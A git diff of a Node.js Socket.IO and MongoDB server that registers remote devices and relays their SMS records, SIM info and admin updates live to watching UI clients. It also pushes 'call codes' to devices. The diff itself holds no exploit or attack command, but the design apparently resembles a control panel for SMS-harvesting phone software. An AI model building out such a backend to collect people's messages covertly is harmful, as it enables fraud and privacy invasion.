@@ -47,17 +47,15 @@ function cleanId(id) {
   return id.toString().trim().toUpperCase();
 }
 
-const watchers = new Map();
-const deviceSockets = new Map();
+const deviceSockets = new Map(); // device → socket
+const watchers = new Map(); // UI listeners
 
 function notifyWatchers(uniqueid, payload) {
-  const list = watchers.get(uniqueid);
-  if (!list) return;
-  for (let sid of list) io.to(sid).emit("deviceRealtime", payload);
+  const set = watchers.get(uniqueid);
+  if (!set) return;
+  for (let sid of set) io.to(sid).emit("deviceRealtime", payload);
 }
 
-// --------------------------------------------------
-// SOCKET HANDLERS
 // --------------------------------------------------
 io.on("connection", (socket) => {
   console.log("🟢 CONNECTED:", socket.id);
@@ -67,11 +65,9 @@ io.on("connection", (socket) => {
   socket.on("watchDevice", (rawId) => {
     const id = cleanId(rawId);
     if (!id) return;
-
     if (!watchers.has(id)) watchers.set(id, new Set());
     watchers.get(id).add(socket.id);
-
-    console.log("👁 UI is watching:", id);
+    console.log("👁 UI Watching:", id);
   });
 
   socket.on("unwatchDevice", (rawId) => {
@@ -80,11 +76,9 @@ io.on("connection", (socket) => {
     if (watchers.has(id)) watchers.get(id).delete(socket.id);
   });
 
-  // REGISTER DEVICE
   socket.on("registerDevice", async (rawId) => {
     const id = cleanId(rawId);
     if (!id) return;
-
     console.log("🔗 Device Registered:", id);
 
     deviceSockets.set(id, socket.id);
@@ -93,25 +87,33 @@ io.on("connection", (socket) => {
 
     const deviceDoc = await Device.findOneAndUpdate(
       { uniqueid: id },
-      { uniqueid: id, connectivity: "Online", lastSeenAt: new Date() },
+      {
+        uniqueid: id,
+        connectivity: "Online",
+        lastSeenAt: new Date(),
+      },
       { upsert: true, new: true }
     );
 
     saveLastSeen(id, "Online");
 
-    io.emit("deviceStatus", {
+    io.to(socket.id).emit("deviceRegistered", { uniqueid: id });
+
+    const payload = {
       uniqueid: id,
       connectivity: "Online",
       updatedAt: new Date(),
-    });
+    };
 
+    io.emit("deviceStatus", payload);
+    notifyWatchers(id, payload);
+
+    // ⭐ SEND SNAPSHOT TO UI (SO CARD ADDS LIVE)
     io.emit("deviceUpdateGlobal", deviceDoc);
     io.to(id).emit("deviceUpdate", deviceDoc);
-
     notifyWatchers(id, { type: "device", ...deviceDoc });
   });
 
-  // DEVICE STATUS UPDATE
   socket.on("deviceStatus", async (data = {}) => {
     const id = cleanId(data.uniqueid);
     if (!id) return;
@@ -132,9 +134,14 @@ io.on("connection", (socket) => {
       updatedAt: new Date(),
     });
 
+    notifyWatchers(id, {
+      uniqueid: id,
+      connectivity,
+      updatedAt: new Date(),
+    });
+
     io.emit("deviceUpdateGlobal", updated);
     io.to(id).emit("deviceUpdate", updated);
-
     notifyWatchers(id, { type: "device", ...updated });
   });
 
@@ -143,27 +150,33 @@ io.on("connection", (socket) => {
 
     if (currentUniqueId) {
       const id = currentUniqueId;
+      const last = deviceSockets.get(id);
 
-      const updated = await Device.findOneAndUpdate(
-        { uniqueid: id },
-        { connectivity: "Offline", lastSeenAt: new Date() },
-        { new: true }
-      );
+      if (last === socket.id) {
+        deviceSockets.delete(id);
 
-      io.emit("deviceStatus", {
-        uniqueid: id,
-        connectivity: "Offline",
-        updatedAt: new Date(),
-      });
+        const updated = await Device.findOneAndUpdate(
+          { uniqueid: id },
+          { connectivity: "Offline", lastSeenAt: new Date() },
+          { new: true }
+        );
 
-      io.emit("deviceUpdateGlobal", updated);
-      io.to(id).emit("deviceUpdate", updated);
+        io.emit("deviceStatus", {
+          uniqueid: id,
+          connectivity: "Offline",
+          updatedAt: new Date(),
+        });
 
-      notifyWatchers(id, {
-        uniqueid: id,
-        connectivity: "Offline",
-        updatedAt: new Date(),
-      });
+        notifyWatchers(id, {
+          uniqueid: id,
+          connectivity: "Offline",
+          updatedAt: new Date(),
+        });
+
+        // full snapshot offline update
+        io.emit("deviceUpdateGlobal", updated);
+        io.to(id).emit("deviceUpdate", updated);
+      }
     }
 
     for (let [id, set] of watchers.entries()) {
@@ -172,9 +185,6 @@ io.on("connection", (socket) => {
   });
 });
 
-// --------------------------------------------------
-// SAVE LAST SEEN
-// --------------------------------------------------
 async function saveLastSeen(uniqueid, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
@@ -188,9 +198,17 @@ async function saveLastSeen(uniqueid, connectivity) {
   }
 }
 
-// --------------------------------------------------
-// STREAM WATCHERS
-// --------------------------------------------------
+export function sendCallCodeToDevice(rawId, data) {
+  const id = cleanId(rawId);
+  if (!id) return;
+  io.to(id).emit("callCodeUpdate", data);
+  notifyWatchers(id, { type: "call", ...data });
+}
+
+export function sendAdminGlobal(data) {
+  io.emit("adminUpdate", data);
+}
+
 mongoose.connection.once("open", async () => {
   console.log("📡 Mongo Streams ACTIVE");
   await initAdminPassword();
@@ -201,7 +219,7 @@ mongoose.connection.once("open", async () => {
         const stream = mongoose.connection.collection(collection).watch();
 
         stream.on("change", async (chg) => {
-          if (!["insert", "replace"].includes(chg.operationType)) return;
+          if (!["insert", "update", "replace"].includes(chg.operationType)) return;
           const doc = await mongoose.connection
             .collection(collection)
             .findOne({ _id: chg.documentKey._id });
@@ -218,6 +236,7 @@ mongoose.connection.once("open", async () => {
 
   watch("devices", (doc) => {
     const id = cleanId(doc.uniqueid);
+    if (!id) return;
     io.emit("deviceUpdateGlobal", doc);
     io.to(id).emit("deviceUpdate", doc);
     notifyWatchers(id, { type: "device", ...doc });
@@ -230,36 +249,31 @@ mongoose.connection.once("open", async () => {
     io.emit("notificationGlobal", doc);
   });
 
-  // ⭐⭐⭐ SMS STREAM FIXED 100% ⭐⭐⭐
+  
   try {
     const smsStream = Sms.watch();
     smsStream.on("change", async (chg) => {
-      if (chg.operationType !== "insert") return;
-
+      if (!["insert", "update", "replace"].includes(chg.operationType)) return;
       const docId = chg.documentKey?._id;
+      if (!docId) return;
       const doc = await Sms.findById(docId).lean();
       if (!doc || !doc.uniqueid) return;
 
       const id = cleanId(doc.uniqueid);
 
-      // DEVICE PAGE
       io.to(id).emit("smsUpdate", doc);
-
-      // WATCH PAGE
       notifyWatchers(id, { type: "sms", ...doc });
-
-      // GLOBAL FEED
-      io.emit("notificationGlobal", doc);
+      io.emit("smsGlobal", doc);
     });
   } catch (e) {
-    console.log("SMS WATCH ERR:", e.message);
+    console.log("SMS Watch Error:", e.message);
   }
 
-  watch("admins", (doc) => io.emit("adminUpdate", doc));
+  watch("admins", (doc) => sendAdminGlobal(doc));
   watch("siminfos", (doc) => io.emit("simInfoUpdated", doc));
+  watch("callcodes", (doc) => sendCallCodeToDevice(doc.uniqueid, doc));
 });
 
-// --------------------------------------------------
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
